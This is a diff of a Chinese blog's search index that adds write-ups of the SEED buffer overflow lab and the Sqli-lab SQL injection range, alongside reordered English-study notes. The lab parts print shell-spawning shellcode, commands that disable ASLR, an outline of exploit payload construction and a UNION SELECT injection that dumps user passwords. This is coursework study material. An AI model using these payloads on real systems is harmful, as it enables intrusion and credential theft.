@@ -192,68 +192,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DVWA靶场</title>
-    <url>/2021/10/24/DVWA%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场通过phpstudy搭建。</p>
-<p>DVWA 是一个入门的 Web 安全学习靶场，说简单也不简单，结合源码去学习的话，不仅可以入门安全也还可以学到不少安全加固的知识</p>
-<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EnglishNotebook</title>
-    <url>/2021/08/03/EnglishNotebook/</url>
-    <content><![CDATA[<h1 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>重新捡起英语</p>
-<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="听说"><a href="#听说" class="headerlink" title="听说"></a>听说</h3><h4 id="连读现象："><a href="#连读现象：" class="headerlink" title="连读现象："></a>连读现象：</h4><ol>
-<li>前一个以辅音音标结尾，后一个以元音音标开始，连读。<br><img src="/2021/08/03/EnglishNotebook/image-20210804142126221.png" alt="image-20210804142126221"></li>
-<li>前一个以[d]音标结尾，后一个以[j]开始，连读作[dj]（zhi）<br><img src="/2021/08/03/EnglishNotebook/image-20210804142628668.png" alt="image-20210804142628668"></li>
-<li>前一个以[t]音标结尾，后一个以[j]开始，连读作[tf]（chi）<br><img src="/2021/08/03/EnglishNotebook/image-20210804143412154.png" alt="image-20210804143412154"></li>
-</ol>
-<h4 id="失爆现象："><a href="#失爆现象：" class="headerlink" title="失爆现象："></a>失爆现象：</h4><ol>
-<li>爆破音一共有六个：[p]、[b]、[t]、[d]、[k]、[g]</li>
-<li>前一个以爆破音结尾，后一个以爆破音开始，前一个爆破音失去爆破，只有嘴型。<br><img src="/2021/08/03/EnglishNotebook/image-20210804152200403.png" alt="image-20210804152200403"></li>
-<li>前一个以爆破音结尾，后一个以[tf]（chi）、[dj]（zhi）、[θ]（si）开始，失去爆破。<br><img src="/2021/08/03/EnglishNotebook/image-20210804153232639.png" alt="image-20210804153232639"></li>
-<li>前一个以[t]、[d]结尾，后一个以[m]、[n]、[l]、[s]开始，失去爆破<br><img src="/2021/08/03/EnglishNotebook/image-20210804160649620.png" alt="image-20210804160649620"></li>
-</ol>
-<h3 id="读写译"><a href="#读写译" class="headerlink" title="读写译"></a>读写译</h3><p>正确表达英语需要语法等的积累，选择一本语法书去读，看原文名著。</p>
-<p>尝试去写、翻译一篇文章。</p>
-]]></content>
-      <categories>
-        <category>English</category>
-      </categories>
-      <tags>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EnglishSix</title>
-    <url>/2021/09/22/EnglishSix/</url>
-    <content><![CDATA[<h1 id="EnglishSix"><a href="#EnglishSix" class="headerlink" title="EnglishSix"></a>EnglishSix</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>六级在即，学英语</p>
-<h2 id="Words"><a href="#Words" class="headerlink" title="Words"></a>Words</h2><p>背单词时间表（获得网址：<a href="https://17gre.github.io/17GRE/">https://17gre.github.io/17GRE/</a> ）</p>
-<p><img src="/2021/09/22/EnglishSix/image-20210926125114701.png" alt="image-20210926125114701"></p>
-<p>早上学新单词，晚上复习旧单词。</p>
-<h2 id="Reading-Comprehension"><a href="#Reading-Comprehension" class="headerlink" title="Reading Comprehension"></a>Reading Comprehension</h2><p>阅读理解参考书：《杨鹏长难句文字》</p>
-<p><img src="/2021/09/22/EnglishSix/image-20210923144826224.png" alt="image-20210923144826224"></p>
-<p>四种训练方式：</p>
-<ol>
-<li>意群训练。</li>
-<li>不回视训练。</li>
-<li>合理化原则推理训练。</li>
-<li>速度与理解力的平衡点训练。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>English</category>
-      </categories>
-      <tags>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTF攻防世界web新手区2</title>
     <url>/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/</url>
     <content><![CDATA[<h1 id="CTF攻防世界web新手区2"><a href="#CTF攻防世界web新手区2" class="headerlink" title="CTF攻防世界web新手区2"></a>CTF攻防世界web新手区2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>昨天做了前6道题，其实有点仓促，今天把剩下的做完。</p>
@@ -321,6 +259,68 @@
       </categories>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA靶场</title>
+    <url>/2021/10/24/DVWA%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场通过phpstudy搭建。</p>
+<p>DVWA 是一个入门的 Web 安全学习靶场，说简单也不简单，结合源码去学习的话，不仅可以入门安全也还可以学到不少安全加固的知识</p>
+<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EnglishNotebook</title>
+    <url>/2021/08/03/EnglishNotebook/</url>
+    <content><![CDATA[<h1 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>重新捡起英语</p>
+<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="听说"><a href="#听说" class="headerlink" title="听说"></a>听说</h3><h4 id="连读现象："><a href="#连读现象：" class="headerlink" title="连读现象："></a>连读现象：</h4><ol>
+<li>前一个以辅音音标结尾，后一个以元音音标开始，连读。<br><img src="/2021/08/03/EnglishNotebook/image-20210804142126221.png" alt="image-20210804142126221"></li>
+<li>前一个以[d]音标结尾，后一个以[j]开始，连读作[dj]（zhi）<br><img src="/2021/08/03/EnglishNotebook/image-20210804142628668.png" alt="image-20210804142628668"></li>
+<li>前一个以[t]音标结尾，后一个以[j]开始，连读作[tf]（chi）<br><img src="/2021/08/03/EnglishNotebook/image-20210804143412154.png" alt="image-20210804143412154"></li>
+</ol>
+<h4 id="失爆现象："><a href="#失爆现象：" class="headerlink" title="失爆现象："></a>失爆现象：</h4><ol>
+<li>爆破音一共有六个：[p]、[b]、[t]、[d]、[k]、[g]</li>
+<li>前一个以爆破音结尾，后一个以爆破音开始，前一个爆破音失去爆破，只有嘴型。<br><img src="/2021/08/03/EnglishNotebook/image-20210804152200403.png" alt="image-20210804152200403"></li>
+<li>前一个以爆破音结尾，后一个以[tf]（chi）、[dj]（zhi）、[θ]（si）开始，失去爆破。<br><img src="/2021/08/03/EnglishNotebook/image-20210804153232639.png" alt="image-20210804153232639"></li>
+<li>前一个以[t]、[d]结尾，后一个以[m]、[n]、[l]、[s]开始，失去爆破<br><img src="/2021/08/03/EnglishNotebook/image-20210804160649620.png" alt="image-20210804160649620"></li>
+</ol>
+<h3 id="读写译"><a href="#读写译" class="headerlink" title="读写译"></a>读写译</h3><p>正确表达英语需要语法等的积累，选择一本语法书去读，看原文名著。</p>
+<p>尝试去写、翻译一篇文章。</p>
+]]></content>
+      <categories>
+        <category>English</category>
+      </categories>
+      <tags>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EnglishSix</title>
+    <url>/2021/09/22/EnglishSix/</url>
+    <content><![CDATA[<h1 id="EnglishSix"><a href="#EnglishSix" class="headerlink" title="EnglishSix"></a>EnglishSix</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>六级在即，学英语</p>
+<h2 id="Words"><a href="#Words" class="headerlink" title="Words"></a>Words</h2><p>背单词时间表（获得网址：<a href="https://17gre.github.io/17GRE/">https://17gre.github.io/17GRE/</a> ）</p>
+<p><img src="/2021/09/22/EnglishSix/image-20210926125114701.png" alt="image-20210926125114701"></p>
+<p>早上学新单词，晚上复习旧单词。</p>
+<h2 id="Reading-Comprehension"><a href="#Reading-Comprehension" class="headerlink" title="Reading Comprehension"></a>Reading Comprehension</h2><p>阅读理解参考书：《杨鹏长难句文字》</p>
+<p><img src="/2021/09/22/EnglishSix/image-20210923144826224.png" alt="image-20210923144826224"></p>
+<p>四种训练方式：</p>
+<ol>
+<li>意群训练。</li>
+<li>不回视训练。</li>
+<li>合理化原则推理训练。</li>
+<li>速度与理解力的平衡点训练。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>English</category>
+      </categories>
+      <tags>
+        <tag>Note</tag>
       </tags>
   </entry>
   <entry>
@@ -507,6 +507,173 @@
       </tags>
   </entry>
   <entry>
+    <title>SEED 2.0 Softwarelab3:Buffer Overflow Attack Lab</title>
+    <url>/2021/11/09/SEED_lab3/</url>
+    <content><![CDATA[<h1 id="Buffer-Overflow-Attack-Lab"><a href="#Buffer-Overflow-Attack-Lab" class="headerlink" title="Buffer Overflow Attack Lab"></a>Buffer Overflow Attack Lab</h1><h2 id="Set-UID版本"><a href="#Set-UID版本" class="headerlink" title="Set-UID版本"></a>Set-UID版本</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
+<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
+<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
+<h3 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h3><h4 id="关闭地址空间随机化"><a href="#关闭地址空间随机化" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>系统会随机化堆和堆栈的起始地址。猜测地址是缓冲溢出攻击的关键步骤之一。可以使用以下命令丢弃此功能：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置-bin-sh"><a href="#配置-bin-sh" class="headerlink" title="配置/bin/sh"></a>配置/bin/sh</h4><p>因为现在/bin/sh符号链接指向/bin/dash，而在第一次实验中，我们知道dash对set-UID程序有个安全策略，放弃特权。</p>
+<p>所以我们需要改变符号链接到/bin/zsh，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="StackGuard和不可执行栈"><a href="#StackGuard和不可执行栈" class="headerlink" title="StackGuard和不可执行栈"></a>StackGuard和不可执行栈</h4><p>这个会在编译时关闭，这两个也是保护程序安全的策略，之后会讨论</p>
+<h3 id="Task-1-Getting-Familiar-with-Shellcode"><a href="#Task-1-Getting-Familiar-with-Shellcode" class="headerlink" title="Task 1: Getting Familiar with Shellcode"></a>Task 1: Getting Familiar with Shellcode</h3><p>提供三个版本的shellcode：c版本、32-bit和64-bit，这里只提供c</p>
+<h4 id="c-version"><a href="#c-version" class="headerlink" title="c version"></a>c version</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意思是，shellcode就是调用了一个/bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h4><p>源码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> shellcode[] =                     <span class="comment">//就是汇编代码的二进制形式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __x86_64__                              </span></span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">    <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">500</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(code, shellcode); <span class="comment">// Copy the shellcode to the stack</span></span><br><span class="line">    <span class="keyword">int</span> (*func)() = (<span class="keyword">int</span>(*)())code;</span><br><span class="line">    func(); <span class="comment">// Invoke the shellcode from the stack</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为已经提供了Makefile文件，所以可以很简单的实现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make             <span class="comment">#生成a32.out和a64.out</span></span><br><span class="line">./a32.out        <span class="comment">#调用shell </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h3><p>从源码审计知道：</p>
+<ol>
+<li>漏洞出在bof函数中的<code>strcpy(buffer, str)</code>函数</li>
+<li>我们需要在badfile文件中填入payload造成缓冲区溢出漏洞</li>
+</ol>
+<p>准备四个难度的Level，已经提供了相应的Makefile</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make                     <span class="comment"># 利用以下命令生成4个Level</span></span><br><span class="line"><span class="comment"># gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c </span></span><br><span class="line"><span class="comment"># sudo chown root stack</span></span><br><span class="line"><span class="comment"># sudo chmod 4755 stack</span></span><br><span class="line"><span class="comment"># 知道程序是32位程序，编译时关闭了前面提到的两个安全策略，最后是属于root用户的set-uid程序</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><a href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Task 3: Launching Attack on 32-bit Program (Level 1)"></a>Task 3: Launching Attack on 32-bit Program (Level 1)</h3><p>按如下步骤发动缓冲区溢出攻击：</p>
+<ol>
+<li><code>gdb stack-L1-dbg</code>得到bof函数的地址以及buffer的地址<br><img src="/2021/11/09/SEED_lab3/image-20211110172748213.png" alt="image-20211110172748213"></li>
+<li>创建badfile文件，<code>touch badfile</code></li>
+<li>修改exploit.py文件<br><img src="/2021/11/09/SEED_lab3/image-20211110173007659.png" alt="image-20211110173007659"></li>
+<li>生成payload并攻击<br><img src="/2021/11/09/SEED_lab3/image-20211110173120280.png" alt="image-20211110173120280"></li>
+<li>可以看到我们成功拿到root权限</li>
+</ol>
+<p>如何修改exploit？</p>
+<ol>
+<li>shellcode是复制的，就是shellcode的32bit汇编版本</li>
+<li>ret是返回地址，返回shellcode的第一条指令</li>
+<li>offset是ebp和buffer地址的间隔</li>
+<li>L等于4是32位程序</li>
+</ol>
+<h3 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h3><p>不知道缓冲区大小，但是知道缓冲区大小的范围是100-200</p>
+<p>所以我们其实不知道的是offset的大小，只查看buffer的地址吧。</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110203921358.png" alt="image-20211110203921358"></p>
+<p>修改exploit.py</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110204203357.png" alt="image-20211110204203357"></p>
+<p>攻击成功</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110204241360.png" alt="image-20211110204241360"></p>
+<h3 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h3><p>同上一个任务类似，但是这次是64位的程序</p>
+<h2 id="Server版本"><a href="#Server版本" class="headerlink" title="Server版本"></a>Server版本</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
+<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
+<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
+<h3 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h3><h4 id="关闭地址空间随机化-1"><a href="#关闭地址空间随机化-1" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>ALSR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h4><p>实验所用的漏洞程序是<code>server-code</code>文件夹的<code>stack.c</code>程序。</p>
+<p>我们的任务是利用这个漏洞得到root权限。</p>
+<p>程序拥有root权限，运行在一个服务器中，它的标准输入被重定向到一个在远程用户和服务器之间的TCP连接。</p>
+<p>就是说，程序能从一个远程用户得到数据。</p>
+<p>要编译上述漏洞程序，我们需要使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭StackGuard和非可执行堆栈保护，<code>L1</code>设置为具体的值</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c          <span class="comment"># 我设置的L1为250</span></span><br></pre></td></tr></table></figure>
+
+<p>在文件夹，通过<code>make</code>命令去按照<code>Makefile</code>编译程序，然后<code>make install</code>命令安装，让编译得到的二进制能够被容器使用。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/09/SEED_lab3/image-20211109151506071.png" alt="image-20211109151506071"></p>
+<p><code>server-code</code>文件夹里的<code>server.c</code>是服务器入口点，监听9090端口</p>
+<p>当收到TCP连接时，会将TCP收到的数据作为标准输入到<code>stack</code>程序，我们没必要去读<code>server.c</code>的源码。</p>
+<h4 id="容器搭建和命令"><a href="#容器搭建和命令" class="headerlink" title="容器搭建和命令"></a>容器搭建和命令</h4><p>起环境，docker容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dcbuild      <span class="comment"># alias for: docker-compose build</span></span><br><span class="line">dcup         <span class="comment"># alias for: docker-compose up</span></span><br><span class="line">dcdown       <span class="comment"># alias for: docker-compose down</span></span><br><span class="line">dockps       <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">docksh &lt;id&gt;  <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h3><p>Shellcode通常被用在代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。</p>
+<p>在本实验中只提供二进制版本的shellcode</p>
+<ol>
+<li><p>生成32位和64位二进制shellcode文件<code>codefile32</code>和<code>codefile64</code></p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211109161302510.png" alt="image-20211109161302510"></p>
+</li>
+<li><p>编译<code>call_shellcode.c</code>，我们可以使用<code>a32.out</code>和<code>a64.out</code>来分别调用上一步生成的shellcode文件<br><img src="/2021/11/09/SEED_lab3/image-20211109162148430.png" alt="image-20211109162148430"></p>
+</li>
+<li><p>测试shellcode<br><img src="/2021/11/09/SEED_lab3/image-20211109163524900.png" alt="image-20211109163524900"></p>
+</li>
+<li><p>修改shellcode，可以用来删除文件，<br><img src="/2021/11/09/SEED_lab3/image-20211109223939250.png" alt="image-20211109223939250"><br><img src="/2021/11/09/SEED_lab3/image-20211109223844600.png" alt="image-20211109223844600"></p>
+</li>
+</ol>
+<h3 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h3><p>第一个目标是10.9.0.0端口是9090，漏洞程序stack是32位程序。</p>
+<p>服务器将接受517字节的输入，会造成缓冲区溢出。</p>
+<ol>
+<li>先测试我们的服务器是否正常、<br><img src="/2021/11/09/SEED_lab3/image-20211109225003621.png" alt="image-20211109225003621"><br>正常返回，我们得到了栈帧指针的值<code>ebp</code>和buffer的地址</li>
+<li>我们修改位于<code>attack-code</code>文件夹下面的<code>exploit.py</code>，构造我们的payload<br><img src="/2021/11/09/SEED_lab3/image-20211109230829919.png" alt="image-20211109230829919"><br><img src="/2021/11/09/SEED_lab3/image-20211109231006268.png" alt="image-20211109231006268"></li>
+<li>监听9090端口，反向shell得到root权限<br><img src="/2021/11/09/SEED_lab3/image-20211109232608115.png" alt="image-20211109232608115"></li>
+</ol>
+<p>Level-1给了2个Hint：</p>
+<ol>
+<li>ebp地址</li>
+<li>buffer地址</li>
+</ol>
+<p>从hint中我们得到buffer的大小为offset，构造content，也就是最后badfile文件内容：</p>
+<ol>
+<li>先用NOP空指令将content数组填充</li>
+<li>[0:offset]，内容是NOP指令，缓冲区数据。</li>
+<li>[offset:offset+4]，就是ret指令返回的地址（小端法），我们要执行恶意代码，最小为ebp+8最大为517-len(shellcode)</li>
+<li>[517-len(shellcode):517]，填充shellcode恶意代码</li>
+</ol>
+<h3 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h3><p>为了增加难度，在本任务中将不会给出ebp地址</p>
+<p><img src="/2021/11/09/SEED_lab3/image-20211110140909438.png" alt="image-20211110140909438"></p>
+<p>如图所示只给出了buffer的地址，我们不知道buffer的大小。</p>
+<p>同时，为了降低难度，缓冲区的大小被设定为<code>[100,300]</code>。</p>
+<p>所以解法是暴力枚举，每个大小都试一下</p>
+]]></content>
+      <categories>
+        <category>软件安全</category>
+      </categories>
+      <tags>
+        <tag>课程作业</tag>
+        <tag>Lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqli-lab靶场</title>
+    <url>/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="Sqli-lab靶场"><a href="#Sqli-lab靶场" class="headerlink" title="Sqli-lab靶场"></a>Sqli-lab靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过win10 docker搭建，80端口映射到本机的8888端口。</p>
+<p>通过这个靶场可以系统学习sqli</p>
+<h2 id="Basic-Chanlleges"><a href="#Basic-Chanlleges" class="headerlink" title="Basic Chanlleges"></a>Basic Chanlleges</h2><p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025130228841-16351381501851.png" alt="image-20211025130228841"></p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>GET传参-基于报错-单引号-字符串</p>
+<p><code>?id=1</code>有两个回显，存在注入点</p>
+<p><code>?id=1&#39;</code>出现报错，是<code>MySQL</code>报错，我们该学习如何去看报错<br><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025153901539.png" alt="image-20211025153901539"></p>
+<p>在上图的near后面是<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，我们去掉左右两个引号出错的的地方是<code>&#39;1&#39;&#39; LIMIT 0,1</code>，只有三个<code>&#39;</code>，所以语法错误。</p>
+<p>union 联合查询，将两个select语句的查询结果一起返回，回显到我们的页面。</p>
+<p>但是需要注意的是，两个select的列数要一样，才能回显。</p>
+<p><code>?id=&#39; union select 1,2,3--+</code>，不仅可以得到列数，还可以得到回显的位置</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162213822.png" alt="image-20211025162213822"></p>
+<p>所以2,3都是回显的位置，所以接下来可以使用hackbar的一些语句去获得mysql的数据了。</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162502494.png" alt="image-20211025162502494"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+</span><br></pre></td></tr></table></figure>
+
+<p>0x3c62723e是<code>&lt;br&gt;</code>的hex编码。</p>
+<p>将表名使用hex编码或者利用CHAR()函数，可以绕过单引号限制</p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>GET传参-基于报错-基于整型</p>
+<p>根据报错判断出id是一个整型的注入点，不需要闭合，接下来就和上一题一样</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>GET传参-基于报错-带括号的单引号</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025184518768.png" alt="image-20211025184518768"></p>
+<p>根据报错判断闭合方式为<code>?id=1&#39;) </code>，其他同上</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>GET传参-基于报错-双引号</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025185000471.png" alt="image-20211025185000471"></p>
+<p>根据报错，闭合方式为<code>?id=1&quot;)</code>，其他同上</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>GET传参-二次注入-单引号-字符串</p>
+<p>与前面的改变是select没有回显，也就是说不能使用union联合注入查询数据库信息。</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025190605757.png" alt="image-20211025190605757"></p>
+<p>根据报错，与Less-1的闭合方式相同是<code>?id=1&#39;</code></p>
+<p>这道题需要用的是报错注入，hackbar自己提供了一个基于extractvalue()函数的报错注入</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202543008.png" alt="image-20211025202543008"></p>
+<p>成功报错得到数据库名</p>
+<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202703212.png" alt="image-20211025202703212"></p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>GET传参-二次注入-双引号-字符串</p>
+]]></content>
+      <categories>
+        <category>CS:APP</category>
+      </categories>
+      <tags>
+        <tag>课程作业</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SEED 2.0 Softwarelab2:Shellshock Attack Lab</title>
     <url>/2021/10/28/SEED_lab2/</url>
     <content><![CDATA[<h1 id="Shellshock-Attack-Lab"><a href="#Shellshock-Attack-Lab" class="headerlink" title="Shellshock Attack Lab"></a>Shellshock Attack Lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>shellshock漏洞可以利用很多系统，它可以被远程或者本地一个机器启动。</p>
@@ -589,7 +756,7 @@
